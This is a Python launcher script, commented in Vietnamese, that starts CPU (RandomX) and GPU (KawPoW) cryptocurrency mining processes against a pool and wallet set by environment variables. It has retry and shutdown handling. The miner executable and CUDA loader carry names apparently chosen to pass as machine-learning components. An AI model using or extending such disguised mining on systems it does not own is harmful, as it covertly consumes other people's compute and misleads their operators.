"""
start_mining.py

Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
"""

import os
import sys
import subprocess
import threading
import signal
import time
from pathlib import Path

from mining_environment.scripts.logging_config import setup_logging
from mining_environment.scripts import setup_env, system_manager

# Thiết lập đường dẫn logs
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

# Thiết lập logging
logger = setup_logging('start_mining', Path(LOGS_DIR) / 'start_mining.log', 'INFO')

# Sự kiện dừng để xử lý graceful shutdown
stop_event = threading.Event()

def signal_handler(signum, frame):
    """
    Xử lý tín hiệu dừng (SIGINT, SIGTERM).
    """
    logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def initialize_environment():
    """
    Thiết lập môi trường khai thác.
    """
    logger.info("Bắt đầu thiết lập môi trường khai thác.")
    try:
        setup_env.setup()
        logger.info("Thiết lập môi trường thành công.")
    except Exception as e:
        logger.error(f"Lỗi khi thiết lập môi trường: {e}")
        sys.exit(1)

def start_system_manager():
    """
    Khởi động Resource Manager trong một thread riêng.
    """
    logger.info("Khởi động Resource Manager...")
    try:
        system_manager.start()
        logger.info("Resource Manager đã được khởi động.")
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        stop_system_manager()

def stop_system_manager():
    """
    Dừng Resource Manager và các tài nguyên liên quan.
    """
    logger.info("Đang dừng Resource Manager...")
    try:
        system_manager.stop()
        logger.info("Resource Manager đã được dừng thành công.")
    except Exception as e:
        logger.error(f"Lỗi khi dừng Resource Manager: {e}")

def is_mining_process_running(process):
    """
    Kiểm tra xem quá trình khai thác có đang chạy không.
    """
    return process and process.poll() is None

def start_mining_process(cpu=True, retries=3, delay=5):
    """
    Khởi động quá trình khai thác CPU/GPU với cơ chế thử lại.
    """
    executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
    if not executable:
        logger.error(f"Biến môi trường {'ML_COMMAND' if cpu else 'CUDA_COMMAND'} không được thiết lập.")
        stop_event.set()
        return None

    if not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền: {executable}")
        stop_event.set()
        return None

    mining_server = os.getenv('MINING_SERVER_CPU' if cpu else 'MINING_SERVER_GPU')
    mining_wallet = os.getenv('MINING_WALLET_CPU' if cpu else 'MINING_WALLET_GPU')
    if not mining_server or not mining_wallet:
        logger.error("Biến môi trường MINING_SERVER hoặc MINING_WALLET không được thiết lập.")
        stop_event.set()
        return None

    mining_command = [
        executable,
        '-o', mining_server,
        '-u', mining_wallet,
        '--tls'
    ]
    if cpu:
        mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])
    else:
        cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')
        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần {attempt}/{retries})...")
        try:
            process = subprocess.Popen(
                mining_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            logger.info(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} đã được khởi động với PID: {process.pid}")

            time.sleep(2)
            if process.poll() is not None:
                stdout, stderr = process.communicate()
                logger.error(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} kết thúc sớm.")
                if stdout:
                    logger.error(f"STDOUT: {stdout.decode().strip()}")
                if stderr:
                    logger.error(f"STDERR: {stderr.decode().strip()}")
                process = None
            else:
                return process
        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
            process = None

        if attempt < retries:
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)

    logger.error(f"Không thể khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'}.")
    stop_event.set()
    return None

def main():
    """
    Điểm bắt đầu hệ thống khai thác tiền điện tử.
    """
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử =====")
    initialize_environment()

    # Khởi động khai thác CPU
    cpu_process = start_mining_process(cpu=True, retries=3, delay=5)
    if not is_mining_process_running(cpu_process):
        logger.error("Quá trình khai thác CPU không khởi động thành công.")
        stop_event.set()
        stop_system_manager()
        sys.exit(1)

    # Khởi động khai thác GPU nếu cấu hình
    gpu_process = None
    if os.getenv('MINING_SERVER_GPU') and os.getenv('MINING_WALLET_GPU'):
        gpu_process = start_mining_process(cpu=False, retries=3, delay=5)
        if not is_mining_process_running(gpu_process):
            logger.warning("Quá trình khai thác GPU không khởi động thành công.")


    # Khởi động Resource Manager
    resource_thread = threading.Thread(target=start_system_manager, daemon=True)
    resource_thread.start()

    # Vòng lặp chính
    try:
        while not stop_event.is_set():
            if cpu_process and cpu_process.poll() is not None:
                logger.warning("Quá trình khai thác CPU đã kết thúc. Dừng hệ thống.")
                stop_event.set()

            if gpu_process and gpu_process.poll() is not None:
                logger.warning("Quá trình khai thác GPU đã kết thúc. Dừng hệ thống.")
                stop_event.set()

            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Nhận tín hiệu dừng từ người dùng.")
        stop_event.set()
    finally:
        logger.info("Dừng các tiến trình khai thác...")
        if cpu_process:
            cpu_process.terminate()
        if gpu_process:
            gpu_process.terminate()
        stop_system_manager()
        logger.info("===== Dừng hệ thống khai thác =====")

if __name__ == "__main__":
    main()
